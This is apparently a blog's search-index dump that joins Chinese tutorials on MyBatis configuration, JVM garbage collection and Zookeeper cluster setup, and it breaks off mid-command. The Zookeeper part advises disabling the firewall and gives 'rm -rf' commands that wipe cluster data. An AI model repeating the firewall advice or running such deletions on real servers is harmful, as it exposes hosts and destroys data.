12345&lt;configuration&gt; &lt;typeAliases&gt; &lt;typeAlias alias="Employee" type="com.clay.mybatis.bean.Employee" /&gt; &lt;/typeAliases&gt;&lt;/configuration&gt; 当在 XML 里这样配置时，Employee 可以用在任何使用 com.clay.mybatis.bean.Employee 的地方。例如 SQL 映射文件里的 resultType 可以在直接使用类型别名，这样可以省去全限定类名的书写，即 resultType="com.clay.mybatis.bean.Employee"。 12345&lt;mapper namespace="com.clay.mybatis.dao.EmployeeMapper"&gt; &lt;select id="getById" resultType="Employee"&gt; select id, last_name, gender, email from t_employee where id = #{id} &lt;/select&gt;&lt;/mapper&gt; 值得一提的是，在类很多的情况下，还可以指定一个包名，MyBatis 会在包名（包括子包）下面搜索需要的 Java Bean。例如： 12345&lt;configuration&gt; &lt;typeAliases&gt; &lt;package name="com.clay.mybatis.bean"/&gt; &lt;/typeAliases&gt;&lt;/configuration&gt; 每一个在包 com.clay.mybatis.bean 中的 Java Bean，在没有使用 @Alias 注解的情况下，默认会使用 Bean 的首字母小写的非限定类名来作为它的别名。 比如 com.clay.mybatis.bean.Employee 的默认别名为 employee；若有注解，则别名为其注解值。 1234@Alias("employee")public class Employee { ...} 提示 在 MyBatis 中，类型别名不区分大小写 当 Java 包和子包里有相同名称的类时，使用包名作为类型别名则会出错，这时候应该使用 @Alias 注解来解决类型别名冲突的问题 MyBatis 已经为许多常见的 Java 类型内建了相应的类型别名，它们都是不区分大小写的，并为了应对原始类型的命名重复，采取了特殊的命名风格，查看内建的类型别名列表 类型处理器（typeHandlers）MyBatis 在设置预处理语句（PreparedStatement）中的参数或从结果集中取出一个值时，都会用类型处理器将获取到的值以合适的方式转换成 Java 类型。 默认的类型处理器MyBatis 内置了一些默认的类型处理器，完整的类型处理器列表如下： 自定义类型处理器在项目开发中，可以实现 org.apache.ibatis.type.TypeHandler 接口或者继承 org.apache.ibatis.type.BaseTypeHandler 类，以此来重写已有的类型处理器或创建自己的类型处理器来处理不支持的或非标准的类型。 自定义类型处理器 123456789101112131415161718192021222324@MappedJdbcTypes(JdbcType.VARCHAR)public class ExampleTypeHandler extends BaseTypeHandler&lt;String&gt; { @Override public void setNonNullParameter(PreparedStatement ps, int i, String parameter, JdbcType jdbcType) throws SQLException { ps.setString(i, parameter); } @Override public String getNullableResult(ResultSet rs, String columnName) throws SQLException { return rs.getString(columnName); } @Override public String getNullableResult(ResultSet rs, int columnIndex) throws SQLException { return rs.getString(columnIndex); } @Override public String getNullableResult(CallableStatement cs, int columnIndex) throws SQLException { return cs.getString(columnIndex); } } 注册类型处理器 12345&lt;configuration&gt; &lt;typeHandlers&gt; &lt;typeHandler handler="com.clay.mybatis.handler.ExampleTypeHandler"/&gt; &lt;/typeHandlers&gt;&lt;/configuration&gt; 使用上述自定义的类型处理器将会覆盖已有的处理 Java String 类型的属性以及 VARCHAR 类型的参数和结果的类型处理器。特别注意，MyBatis 不会通过检测数据库元信息来决定使用哪种 JDBC 类型，所以必须在参数和结果映射中指明字段是 VARCHAR 类型，以使其能够绑定到正确的类型处理器上，这是因为 MyBatis 直到 SQL 语句被执行时才清楚数据类型。 日期时间类型处理器日期和时间的处理，在 JDK1.8 以前一直是个头疼的问题。我们通常使用 JSR-310（日期和时间 API） 规范领导者 Stephen Colebourne 创建的 Joda-Time 来操作。JDK 1.8 已经实现了全部的 JSR-310 规范，而且 MyBatis 从 3.4.5 开始，默认支持 JSR-310 规范。因此在日期时间处理上，我们可以使用 MyBatis 基于 JSR-310 编写的各种日期时间类型处理器。MyBatis 3.4.5 以前的版本需要我们手动注册这些处理器，以后的版本则都是自动注册的。手动注册的步骤如下： 引入类型转换的依赖 12345&lt;dependency&gt; &lt;groupId&gt;org.mybatis&lt;/groupId&gt; &lt;artifactId&gt;mybatis-typehandlers-jsr310&lt;/artifactId&gt; &lt;version&gt;1.0.2&lt;/version&gt;&lt;/dependency&gt; 注册日期时间类型处理器 1234567891011&lt;configuration&gt; &lt;typeHandlers&gt; &nbsp;&nbsp; &nbsp;&lt;typeHandler handler="org.apache.ibatis.type.InstantTypeHandler" /&gt; &nbsp;&nbsp; &nbsp;&lt;typeHandler handler="org.apache.ibatis.type.LocalDateTimeTypeHandler" /&gt; &nbsp;&nbsp; &nbsp;&lt;typeHandler handler="org.apache.ibatis.type.LocalDateTypeHandler" /&gt; &nbsp;&nbsp; &nbsp;&lt;typeHandler handler="org.apache.ibatis.type.LocalTimeTypeHandler" /&gt; &nbsp;&nbsp; &nbsp;&lt;typeHandler handler="org.apache.ibatis.type.OffsetDateTimeTypeHandler" /&gt; &nbsp;&nbsp; &nbsp;&lt;typeHandler handler="org.apache.ibatis.type.OffsetTimeTypeHandler" /&gt; &nbsp;&nbsp; &nbsp;&lt;typeHandler handler="org.apache.ibatis.type.ZonedDateTimeTypeHandler" /&gt; &lt;/typeHandlers&gt;&lt;/configuration&gt; 提示 在 POJO 类里面，可以使用 java.sql.Date、java.sql.Timestamp、java.util.Date 分别映射数据库的 date、timestamp、datetime 类型，但是这些类许多方法都已经过时。Java 1.8 API 中的 LocalDate、LocalDateTime、LocalTime 现在则比较常用。 对象工厂（objectFactory）每次 MyBatis 创建结果对象的新实例时，它都会使用一个对象工厂（ObjectFactory）实例来完成实例化工作。 默认的对象工厂需要做的仅仅是实例化目标类，要么通过默认无参构造方法，要么通过存在的参数映射来调用带有参数的构造方法。如果想覆盖对象工厂的默认行为，可以通过创建自己的对象工厂来实现。 自定义对象工厂 1234567891011121314151617181920212223public class ExampleObjectFactory extends DefaultObjectFactory { @Override public &lt;T&gt; T create(Class&lt;T&gt; type) { return super.create(type); } @Override public &lt;T&gt; T create(Class&lt;T&gt; type, List&lt;Class&lt;?&gt;&gt; constructorArgTypes, List&lt;Object&gt; constructorArgs) { return super.create(type, constructorArgTypes, constructorArgs); } @Override public void setProperties(Properties properties) { super.setProperties(properties); } @Override public &lt;T&gt; boolean isCollection(Class&lt;T&gt; type) { return Collection.class.isAssignableFrom(type); }} 注册对象工厂 12345&lt;configuration&gt; &lt;objectFactory type="com.clay.mybatis.factory.ExampleObjectFactory"&gt; &lt;property name="someProperty" value="100"/&gt; &lt;/objectFactory&gt;&lt;/configuration&gt; ObjectFactory 接口很简单，它包含两个创建实例用的方法，一个是处理默认无参构造方法的，另外一个是处理带参数的构造方法的。 另外，setProperties 方法可以被用来配置 ObjectFactory，在初始化自定义的 ObjectFactory 实例后，objectFactory 标签内定义的属性会被传递给 setProperties 方法。 插件（plugins）MyBatis 允许你在映射语句执行过程中的某一点进行拦截调用。默认情况下，MyBatis 允许使用插件来拦截的方法调用包括： Executor (update, query, flushStatements, commit, rollback, getTransaction, close, isClosed) ParameterHandler (getParameterObject, setParameters) ResultSetHandler (handleResultSets, handleOutputParameters) StatementHandler (prepare, parameterize, batch, update, query) 这些类中方法的细节可以直接查看 MyBatis 发行包中的源代码。如果你想做的不仅仅是监控方法的调用，那么你最好相当了解要重写的方法的行为。因为在试图修改或重写已有方法的行为时，很可能会破坏 MyBatis 的核心模块。这些都是更底层的类和方法，所以使用插件的时候需要特别小心。插件通过动态代理机制，可以介入四大对象的任何一个方法的执行。通过 MyBatis 提供的强大机制，自定义插件是非常简单的，只需实现 Interceptor 接口，并指定想要拦截的方法即可。 自定义插件 12345678910111213141516171819202122@Intercepts({@Signature( type= Executor.class, method = "update", args = {MappedStatement.class, Object.class})})public class ExamplePlugin implements Interceptor { private Properties properties = new Properties(); @Override public Object intercept(Invocation invocation) throws Throwable { // implement pre processing if need Object returnObject = invocation.proceed(); // implement post processing if need return returnObject; } @Override public void setProperties(Properties properties) { this.properties = properties; }} 注册插件 1234567&lt;configuration&gt; &lt;plugins&gt; &lt;plugin interceptor="com.clay.mybatis.plugin.ExamplePlugin"&gt; &lt;property name="someProperty" value="100"/&gt; &lt;/plugin&gt; &lt;/plugins&gt;&lt;/configuration&gt; 上面自定义的插件将会拦截在 Executor 实例中所有的 update 方法调用，这里的 Executor 是负责执行底层映射语句的内部对象。 环境配置（environments）MyBatis 可以配置成适应多种环境，这种机制有助于将 SQL 映射应用于多种数据库之中，现实情况下有多种理由需要这么做。例如，开发、测试和生产环境需要有不同的配置；或者想在具有相同 Schema 的多个生产数据库中使用相同的 SQL 映射，还有许多类似的使用场景。值得一提的是，尽管 MyBatis 可以配置多个环境，但每个 SqlSessionFactory 实例只能选择一种环境。所以，如果想连接两个数据库，就需要创建两个 SqlSessionFactory 实例，每个数据库对应一个；而如果是三个数据库，就需要三个实例，依此类推。 123456789101112131415&lt;configuration&gt; &lt;environments default="development"&gt; &lt;environment id="development"&gt; &lt;transactionManager type="JDBC"&gt; &lt;property name="..." value="..."/&gt; &lt;/transactionManager&gt; &lt;dataSource type="POOLED"&gt; &lt;property name="driver" value="${driver}"/&gt; &lt;property name="url" value="${url}"/&gt; &lt;property name="username" value="${username}"/&gt; &lt;property name="password" value="${password}"/&gt; &lt;/dataSource&gt; &lt;/environment&gt; &lt;/environments&gt;&lt;/configuration&gt; 注意一些关键点: 默认使用的环境 ID（比如：default="development"） 每个 environment 标签定义的环境 ID（比如：id="development"） 事务管理器的配置（比如：type="JDBC"） 数据源的配置（比如：type="POOLED"） 默认环境和环境 ID 顾名思义。环境 ID 可以随意命名，但务必保证默认的环境 ID 要匹配其中一个环境 ID 为了指定创建哪种环境，只要将它作为可选的参数传递给 SqlSessionFactoryBuilder 即可，可以接受环境配置的两个方法是： 12SqlSessionFactory factory = new SqlSessionFactoryBuilder().build(reader, environment);SqlSessionFactory factory = new SqlSessionFactoryBuilder().build(reader, environment, properties); 如果忽略了环境参数，那么将会加载默认环境，如下所示： 12SqlSessionFactory factory = new SqlSessionFactoryBuilder().build(reader);SqlSessionFactory factory = new SqlSessionFactoryBuilder().build(reader, properties); 事务管理器在 MyBatis 中有两种类型的事务管理器（transactionManager），也就是 type="[JDBC | MANAGED]"。 JDBCJDBC 事务管理器直接使用了 JDBC 的提交和回滚功能，它依赖从数据源获得的连接来管理事务作用域。默认情况下，为了与某些驱动程序兼容，它在关闭连接时启用自动提交。然而，对于某些驱动程序来说，启用自动提交不仅是不必要的，而且是一个代价高昂的操作。因此，从 3.5.10 版本开始，可以通过将 skipSetAutoCommitOnClose 属性设置为 true 来跳过这个步骤。例如： 123&lt;transactionManager type="JDBC"&gt; &lt;property name="skipSetAutoCommitOnClose" value="true"/&gt;&lt;/transactionManager&gt; MANAGEDMANAGED 事务管理器几乎没做什么。它不会提交或回滚一个连接，而是让容器来管理事务的整个生命周期（比如 JEE 应用服务器的上下文）。 默认情况下它会关闭连接。然而一些容器并不希望连接被关闭，因此需要将 closeConnection 属性设置为 false 来阻止默认的关闭行为。例如: 123&lt;transactionManager type="MANAGED"&gt; &lt;property name="closeConnection" value="false"/&gt;&lt;/transactionManager&gt; 提示 如果使用 Spring + MyBatis，则没有必要配置事务管理器，因为 Spring 模块会使用自带的管理器来覆盖前面的配置。 数据源dataSource 标签使用标准的 JDBC 数据源接口来配置 JDBC 连接对象的资源。大多数 MyBatis 应用程序会配置数据源，虽然数据源配置是可选的，但如果要启用延迟加载特性，就必须配置数据源。MyBatis 提供了三种内建的数据源类型，也就是 type="[UNPOOLED | POOLED | JNDI]"。 UNPOOLEDUNPOOLED 数据源的实现会每次请求时打开和关闭连接。虽然有点慢，但对那些数据库连接可用性要求不高的简单应用程序来说，是一个很好的选择。 性能表现则依赖于使用的数据库，对某些数据库来说，使用连接池并不重要，这个配置就很适合这种情形。 driver – 这是 JDBC 驱动的 Java 类全限定名（并不是 JDBC 驱动中可能包含的数据源类）。 url – 这是数据库的 JDBC URL 地址。 username – 登录数据库的用户名。 password – 登录数据库的密码。 defaultTransactionIsolationLevel – 默认的连接事务隔离级别。 defaultNetworkTimeout – 等待数据库操作完成的默认网络超时时间（单位：毫秒）。 作为可选项，你也可以传递属性给数据库驱动。只需在属性名加上 driver. 前缀即可，例如：driver.encoding=UTF8。这将通过 DriverManager.getConnection(url, driverProperties) 方法传递值为 UTF8 的 encoding 属性给数据库驱动。 POOLEDPOOLED 数据源的实现利用了” 池” 的概念将 JDBC 连接对象组织起来，避免了创建新的连接实例时所必需的初始化和认证时间。这种处理方式很流行，能使并发 Web 应用快速响应请求。除了上述提到 UNPOOLED 下的属性外，还有更多属性用来配置 POOLED 的数据源： poolMaximumActiveConnections – 在任意时间可存在的活动（正在使用）连接数量，默认值：10 poolMaximumIdleConnections – 任意时间可能存在的空闲连接数。 poolMaximumCheckoutTime – 在被强制返回之前，池中连接被检出（checked out）时间，默认值：20000 毫秒（即 20 秒） poolTimeToWait – 这是一个底层设置，如果获取连接花费了相当长的时间，连接池会打印状态日志并重新尝试获取一个连接（避免在误配置的情况下一直失败且不打印日志），默认值：20000 毫秒（即 20 秒）。 poolMaximumLocalBadConnectionTolerance – 这是一个关于坏连接容忍度的底层设置，作用于每一个尝试从连接池获取连接的线程。如果这个线程获取到的是一个坏的连接，那么这个数据源允许这个线程尝试重新获取一个新的连接，但是这个重新尝试的次数不应该超过 poolMaximumIdleConnections 与 poolMaximumLocalBadConnectionTolerance 之和。 默认值：3（新增于 3.4.5 版本） poolPingQuery – 发送到数据库的侦测查询，用来检验连接是否正常工作并准备接受请求。默认是 NO PING QUERY SET，这会导致多数数据库驱动出错时返回恰当的错误消息。 poolPingEnabled – 是否启用侦测查询。若开启，需要设置 poolPingQuery 属性为一个可执行的 SQL 语句（最好是一个速度非常快的 SQL 语句），默认值：false。 poolPingConnectionsNotUsedFor – 配置 poolPingQuery 的频率。可以被设置为和数据库连接超时时间一样，来避免不必要的侦测，默认值：0（即所有连接每一时刻都被侦测 — 当然仅当 poolPingEnabled 为 true 时适用）。 JNDIJNDI 数据源的实现是为了能在如 EJB 或应用服务器这类容器中使用，容器可以集中或在外部配置数据源，然后放置一个 JNDI 上下文的数据源引用。这种数据源配置只需要两个属性： initial_context – 这个属性用来在 InitialContext 中寻找上下文，即 initialContext.lookup(initial_context)）。这是个可选属性，如果忽略，那么将会直接从 InitialContext 中寻找 data_source 属性。 data_source – 这是引用数据源实例位置的上下文路径。提供了 initial_context 配置时会在其返回的上下文中进行查找，没有提供时则直接在 InitialContext 中查找。 JNDI 和其他数据源配置类似，可以通过添加前缀 env. 直接把属性传递给 InitialContext。比如 env.encoding=UTF8，这将会在 InitialContext 实例化时往它的构造方法传递值为 UTF8 的 encoding 属性。 通过过实现接口 org.apache.ibatis.datasource.DataSourceFactory 来自定义第三方数据源的实现： 123456public interface DataSourceFactory { void setProperties(Properties props); DataSource getDataSource();} org.apache.ibatis.datasource.unpooled.UnpooledDataSourceFactory 可被用作父类来构建新的数据源适配器，比如下面这段插入 C3P0 数据源所必需的代码： 12345678910import org.apache.ibatis.datasource.unpooled.UnpooledDataSourceFactory;import com.mchange.v2.c3p0.ComboPooledDataSource;public class C3P0DataSourceFactory extends UnpooledDataSourceFactory { public C3P0DataSourceFactory() { this.dataSource = new ComboPooledDataSource(); }} 为了令自定义的数据源工作，记得在配置文件中为每个希望 MyBatis 调用的 setter 方法增加对应的属性。下面是一个可以连接至 PostgreSQL 数据库的例子： 123456&lt;dataSource type="org.myproject.C3P0DataSourceFactory"&gt; &lt;property name="driver" value="org.postgresql.Driver"/&gt; &lt;property name="url" value="jdbc:postgresql:mydb"/&gt; &lt;property name="username" value="postgres"/&gt; &lt;property name="password" value="root"/&gt;&lt;/dataSource&gt; 数据库厂商标识（databaseIdProvider）MyBatis 可以根据不同的数据库厂商执行不同的语句，这种多厂商的支持是基于映射语句中的 databaseId 属性。 MyBatis 会加载带有匹配当前数据库 databaseId 属性和所有不带 databaseId 属性的语句。如果同时找到带有 databaseId 和不带 databaseId 的相同语句，则后者会被舍弃。为支持多厂商特性，只要像下面这样在 mybatis-config.xml 文件中加入 databaseIdProvider 即可： 1&lt;databaseIdProvider type="DB_VENDOR" /&gt; databaseIdProvider 对应的 DB_VENDOR 实现（VendorDatabaseIdProvider）会将 databaseId 设置为 DatabaseMetaData#getDatabaseProductName() 返回的字符串。由于通常情况下这些字符串都非常长，而且相同产品的不同版本会返回不同的值，此时通过设置属性别名来使其变短： 12345678&lt;configuration&gt; &lt;databaseIdProvider type="DB_VENDOR"&gt; &lt;property name="SQL Server" value="sqlserver"/&gt; &lt;property name="DB2" value="db2"/&gt; &lt;property name="MySQL" value="mysql"/&gt; &lt;property name="Oracle" value="oracle" /&gt; &lt;/databaseIdProvider&gt;&lt;/configuration&gt; 提示 在上述的配置中，name 是 getDatabaseProductName() 返回字符串内容的一部分，value 则是属性别名。 在提供了属性别名时，databaseIdProvider 的 DB_VENDOR 实现会将 databaseId 设置为数据库产品名与属性中的名称第一个相匹配的值，如果没有匹配的属性，将会设置为 null。举个例子，假设 getDatabaseProductName() 返回的字符串内容为 “Oracle (DataDirect)”，则 databaseId 将被设置为 oracle。最后需要在编写 SQL 语句时，通过 databaseId 指定属性别名，例如： 123&lt;select id="getById" resultType="Employee" databaseId="mysql"&gt; select id, last_name, gender, email from t_employee where id = #{id}&lt;/select&gt; 映射器（mappers）既然 MyBatis 的行为已经由上述标签配置完了，那么现在就需要定义 SQL 映射语句了。但首先，需要告诉 MyBatis 到哪里去找到这些语句。在自动查找资源方面，Java 并没有提供一个很好的解决方案，所以最好的办法是直接告诉 MyBatis 到哪里去找映射文件。MyBatis 可以使用相对于类路径的资源引用，或完全限定资源定位符（包括 file:/// 形式的 URL），或类名和包名等。例如： 使用相对于类路径的资源引用 提示 如果在 SQL 映射文件中，namespace 是 DAO 接口的全限定类名，那么 MyBatis 会找到对应的 DAO 接口，然后为其生成代理对象。 1234567&lt;configuration&gt; &lt;mappers&gt; &lt;mapper resource="org/mybatis/builder/AuthorMapper.xml"/&gt; &lt;mapper resource="org/mybatis/builder/BlogMapper.xml"/&gt; &lt;mapper resource="org/mybatis/builder/PostMapper.xml"/&gt; &lt;/mappers&gt;&lt;/configuration&gt; 使用完全限定资源定位符（URL） 提示 如果在 SQL 映射文件中，namespace 是 DAO 接口的全限定类名，那么 MyBatis 会找到对应的 DAO 接口，然后为其生成代理对象。 1234567&lt;configuration&gt; &lt;mappers&gt; &lt;mapper url="file:///var/mappers/AuthorMapper.xml"/&gt; &lt;mapper url="file:///var/mappers/BlogMapper.xml"/&gt; &lt;mapper url="file:///var/mappers/PostMapper.xml"/&gt; &lt;/mappers&gt;&lt;/configuration&gt; 使用映射器接口实现类的完全限定类名 特别注意 第一种情况：没有 SQL 映射文件，SQL 语句全部通过注解的方式写在 DAO 接口里，此时可以直接使用此方式 第二种情况：有 SQL 语句写在 SQL 映射文件里，此时必须满足以下两个条件，否则 MyBatis 无法正常映射 SQL 语句 SQL 映射文件必须与 Java 接口文件同名 SQL 映射文件必须与 Java 接口文件放在同一个文件夹下（包） 1234567&lt;configuration&gt; &lt;mappers&gt; &lt;mapper class="org.mybatis.builder.AuthorMapper"/&gt; &lt;mapper class="org.mybatis.builder.BlogMapper"/&gt; &lt;mapper class="org.mybatis.builder.PostMapper"/&gt; &lt;/mappers&gt;&lt;/configuration&gt; 将包内的映射器接口实现全部注册为映射器 特别注意 上述在 "使用映射器接口实现类的完全限定类名" 方式中，介绍到的两种情况也适用于此方式 12345&lt;configuration&gt; &lt;mappers&gt; &lt;package name="org.mybatis.builder"/&gt; &lt;/mappers&gt;&lt;/configuration&gt; 提示 比较重要的、复杂的 DAO 接口，建议将 SQL 语句写在 SQL 映射文件里 不重要的、简单的 DAO 接口，为了快速开发项目，可以通过注解将 SQL 语句写在 DAO 接口里 补充内容处理枚举类型 MyBatis 官方中文文档 - 类型处理器 MyBatis 官方中文文档 - 处理枚举类型 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"java 数据库"},{title:"Java 虚拟机面试题之一",url:"/posts/56993278.html",text:'Java 虚拟机JVM 体系结构JVM 内存结构主要有三大块：栈、堆内存、方法区。堆内存是 JVM 中最大的一块，由新生代和老年代组成，不包括永久代（方法区）；而新生代内存又被分成 Eden 空间、From Survivor 空间、To Survivor 空间，默认情况下新生代按照 8:1:1 的比例来分配。方法区存储类信息、静态变量、常量、常量池等数据，是线程共享的区域，为了与 Java 堆区分，方法区还有一个别名 Non-Heap （非堆）。栈又分为 Java 虚拟机栈和本地方法栈，主要用于方法的执行。 JVM 垃圾收集机制GC 发生在堆中，GC 的类型如下： 次数上频繁收集新生代（Minor GC） 次数上少收集老年代（Full GC） 基本不动方法区 GC 算法 如何确定一个对象是否会被回收 引用计数算法（Reference Counting） 可达性分析算法（Reachability Analysis） GC 算法 复制算法（Copying） 标记 - 清除算法（Mark-Sweep） 标记 - 算法（Mark-Compact） 分代收集算法 GC 算法对比 复制算法 复制算法执行的速度较快，典型的空间换时间 当对象的存活率很高的时候，不断的复制操作会显得耗时 复制算法很明显的缺点就是浪费内存空间，因为将内存分为两块，一次只能使用一块，这也意味着分的块越大，浪费的内存越多 标记 - 清除算法 首先是速度慢，因为” 标记 - 清除算法” 在标记阶段需要使用递归的方式从根结点出发，不断寻找可达的对象；而在清除阶段又需要遍历堆内存中的所有对象，查看其是否被标记，然后清除；并且其实在程序进行 GC 的时候，JVM 中所有的 Java 程序都要进行暂停，俗称 Stop-The-World，后面会提到。 其次是其最大的缺点，使用这种算法进行清理而得的堆内存的空闲空间一般是不连续的，由于对象实例在堆内存中是随机存储的，所以在清理之后，会产生许多的内存碎片，如果这个时候来了一个很大的对象实例，尽管显示内存还足够，但是已经存不下这个大对象了，内存碎片太多会导致当程序需要为较大对象分配内存时无法找到足够的连续内存而不得不提前触发另一次垃圾收集动作。再者，这种零散的碎片对于数组的分配也不是很方便。 标记 - 整理算法 首先这种算法克服了” 标记 - 清除算法” 中会产生内存碎片的缺点，也解决了复制算法中内存减半使用的不足 而其缺点则是速度也不是很快，不仅要遍历标记所有可达结点，还要一个个可达存活对象的地址，所以导致其效率不是很高 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"面试"},{title:"Linux 生产环境搭建 Zookeeper 集群",url:"/posts/8ed765da.html",text:'前言本文适用于在 Centos/Debian/Ubuntu 等 Linux 发行版系统上，使用多台物理机器搭建 Zookeeper 集群。 Zookeeper 简介Zookeeper 是一个高效的分布式协调服务，可以提供配置信息管理、命名、分布式同步、集群管理、数据库切换等服务。它不适合用来存储大量信息，可以用来存储一些配置、发布与订阅等少量信息。Hadoop、Storm、消息中间件、RPC 服务框架、分布式数据库同步系统，这些都是 Zookeeper 的应用场景。 Zookeeper 集群简介在 Linux 生产环境上搭建 Zookeeper 集群，至少需要三个节点（服务器）。 角色划分Zookeeper 集群有三种角色划分，分别是 leader、follower、observer： 领导者（leader）：负责进行投票的发起和决议，更新系统状态。 跟随者（follower）：用于接收客户端请求，并向客户端返回结果，以及在选举过程中参与投票 观察者（observer）：可以接收客户端连接，将写请求转发给 leader 节点，但是不参与投票过程，只同步 leader 的状态，通常用作对查询操作做负载。 端口作用 2181：对客户端端提供服务 2888: 集群内机器相互通信使用 3888: 选举 leader 使用 Zookeeper 集群搭建集群规划 节点 IP 地址 端口 版本号 节点 1 192.168.1.1 2181, 2881, 3881 3.4.10 节点 2 192.168.1.2 2181, 2881, 3881 3.4.10 节点 3 192.168.1.3 2181, 2881, 3881 3.4.10 集群搭建 Zookeeper 下载 Zookeeper 的最新版本可以从 官网 下载，历史版本则可以从 这里 下载。 Zookeeper 安装 1234567891011121314151617# 创建安装目录# mkdir -p /usr/local/zookeeper-cluster# 进入安装目录# cd /usr/local/zookeeper-cluster# 下载压缩包# wget https://archive.apache.org/dist/zookeeper/zookeeper-3.4.10/zookeeper-3.4.10.tar.gz# 解压文件# tar -xvf zookeeper-3.4.10.tar.gz# 重命名目录# mv zookeeper-3.4.10 zookeeper-node-1# 删除压缩包# rm -rf zookeeper-3.4.10.tar.gz Zookeeper 配置 1234567891011121314# 进入安装目录# cd /usr/local/zookeeper-cluster/zookeeper-node-1# 创建数据存储目录# mkdir data# 创建日志存储目录# mkdir logs# 复制配置文件# cp conf/zoo_sample.cfg conf/zoo.cfg# 编辑配置文件（指定以下内容即可）# vim conf/zoo.cfg 123456789# 基础配置clientPort=2181dataDir=/usr/local/zookeeper-cluster/zookeeper-node-1/datadataLogDir=/usr/local/zookeeper-cluster/zookeeper-node-1/logs# 集群配置server.1=192.168.1.1:2881:3881server.2=192.168.1.2:2881:3881server.3=192.168.1.3:2881:3881 提示 server.1=192.168.1.1:2881:3881，分别对应 server.serverid=host:tickpot:electionport serverid：是一个数字，表示这是第几号服务器。下文提到的 myid 文件里面有一个数据就是它的值。Zookeeper 启动时会读取该文件，然后拿到里面的数据与 zoo.cfg 里面的配置信息比较，从而判断当前节点是哪个 server host：服务器的地址，即主机名 / IP 地址 tickpot：服务器 Follower 与集群中的 Leader 服务器交换信息的端口 electionport：用来执行选举时服务器相互通信的端口 Zookeeper 创建 myid 文件 在 Zookeeper 的 data 目录下创建 myid 文件，文件内容是是 1（服务器编号）。 12# 创建myid文件，并写入数据# echo "1" &gt; /usr/local/zookeeper-cluster/zookeeper-node-1/data/myid 注意 myid 文件里的服务器编号可以自定义（全局唯一），但是上下不要有空行，左右不要有空格。 Zookeeper 创建多个节点 复制两份上面已经配置好的 Zookeeper 安装目录到其他服务器节点上，以此作为集群中另外两个节点的安装文件，例如 zookeeper-node-2 和 zookeeper-node-3。安装目录复制完成后，还需要更改每个新节点里的 zoo.cfg 配置文件的 dataDir 与 dataLogDir，并重新指定 myid 文件里的服务器编号。例如： 123456# 节点二的zoo.cfg文件dataDir=/usr/local/zookeeper-cluster/zookeeper-node-2/datadataLogDir=/usr/local/zookeeper-cluster/zookeeper-node-2/logs# 写入节点二的myid文件# echo "2" &gt; /usr/local/zookeeper-cluster/zookeeper-node-2/data/myid 123456# 节点三的zoo.cfg文件dataDir=/usr/local/zookeeper-cluster/zookeeper-node-3/datadataLogDir=/usr/local/zookeeper-cluster/zookeeper-node-3/logs# 写入节点三的myid文件# echo "3" &gt; /usr/local/zookeeper-cluster/zookeeper-node-3/data/myid 集群管理防火墙启动 Zookeeper 集群之前，建议关闭系统防火墙，这可以保证集群之间可以正常互相通信，否则查看 Zookeeper 状态可能会发现报如下的错误： 12Client port found: 2181. Client address: 192.168.1.1.Error contacting service. It is probably not running. 管理命令值得一提的是，Zookeeper 的管理命令（Shell 脚本）都在对应安装目录的 bin 目录下。 12345678# 启动服务# ./zkServer.sh start# 关闭服务# ./zkServer.sh stop# 查看服务状态# ./zkServer.sh status 或者指定配置文件进行操作： 12345678# 启动服务# ./zkServer.sh start ../conf/zoo.cfg # 关闭服务# ./zkServer.sh stop ../conf/zoo.cfg # 查看服务状态# ./zkServer.sh status ../conf/zoo.cfg 集群启动 启动集群 123# /usr/local/zookeeper-cluster/zookeeper-node-1/bin/zkServer.sh start# /usr/local/zookeeper-cluster/zookeeper-node-2/bin/zkServer.sh start# /usr/local/zookeeper-cluster/zookeeper-node-3/bin/zkServer.sh start 查看状态 123# /usr/local/zookeeper-cluster/zookeeper-node-1/bin/zkServer.sh status# /usr/local/zookeeper-cluster/zookeeper-node-2/bin/zkServer.sh status# /usr/local/zookeeper-cluster/zookeeper-node-3/bin/zkServer.sh status 集群正常启动后，各个节点输出的日志信息如下，此时集群的 Leader 是节点二 123456789101112131415ZooKeeper JMX enabled by defaultUsing config: /usr/local/zookeeper-cluster/zookeeper-node-1/bin/../conf/zoo.cfgMode: follower-------------------------------------------------------------------------------ZooKeeper JMX enabled by defaultUsing config: /usr/local/zookeeper-cluster/zookeeper-node-2/bin/../conf/zoo.cfgMode: leader-------------------------------------------------------------------------------ZooKeeper JMX enabled by defaultUsing config: /usr/local/zookeeper-cluster/zookeeper-node-3/bin/../conf/zoo.cfgMode: follower 关闭集群 123# /usr/local/zookeeper-cluster/zookeeper-node-1/bin/zkServer.sh stop# /usr/local/zookeeper-cluster/zookeeper-node-2/bin/zkServer.sh stop# /usr/local/zookeeper-cluster/zookeeper-node-3/bin/zkServer.sh stop 清空数据 若希望清空 Zookeper 集群的数据，则可以先关闭集群，然后再删除 Zookeeper 安装目录下的 data 和 logs 子目录下的数据文件（不包括 myid 文件）即可。清空数据的操作不可恢复，生产环境下慎用。 123456# rm -rf /usr/local/zookeeper-cluster/zookeeper-node-1/data/version-2# rm -rf /usr/local/zookeeper-cluster/zookeeper-node-1/logs/version-2# rm -rf /usr/local/zookeeper-cluster/zookeeper-node-2/data/version-2# rm -rf /usr/local/zookeeper-cluster/zookeeper-node-2/logs/version-2# rm -rf /usr/local/zookeeper-cluster/zookeeper-node-3/data/version-2# rm -rf 